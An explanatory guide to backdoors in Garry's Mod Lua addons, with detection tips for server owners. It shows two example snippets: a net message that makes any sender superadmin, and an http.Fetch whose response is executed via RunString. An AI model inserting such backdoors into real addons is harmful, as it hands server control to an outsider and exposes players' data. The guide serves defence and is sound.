# About backdoors

A "back door" is a different entrace to something which ignores authentication / verification.

An easy example would be:

```lua
net.Receive("MakeMeAdmin",function(len,ply)
    ply:SetUserGroup("superadmin")
end)
```

This code example above would make any player superadmin that could send that net message to the server.

This example is a bit "obvious" because of its net name, normally the code would be obfuscated or name-changed to something innocent.

Most backdoors nowadays are done via http.  
An example:

```lua
http.Fetch("https://example.com/getlua.php?key=3",function(body)
    RunString(body)
end)
```

The above example simply gets the lua file from a webserver and executes it, which means the adversary can change the code that gets executed without having to change the backdoor itself.

This example can also be found rather easily by searching for "http" calls in all your addons (e.g. via CTRL+F), which would require obfuscation to make it more invisible.


## Potential hazards

If someone has access to your "lua server state" they can do everything and anything with it.  
This includes:

 - Steal any and all lua files
 - Make everything superadmin
 - Corrupt database or data/ folder
 - Crash player's game via spam
 - Reset any custom addon settings for players
 - Get the IP, country, etc. of players

That's why it is important to remove any and all backdoors you find.

## Detecting

To detect backdoors you can use scripts that search for your files (e.g. "nomalua" or luctus' bdscanner, found in darkrp-exploits/scripts) or simply search for them yourself.

Most can be found by searching for "http" or "RunString" or "CompileString" through all your lua files.

Some may be harder to find. I recommend to let your developer search through your addons to find them.
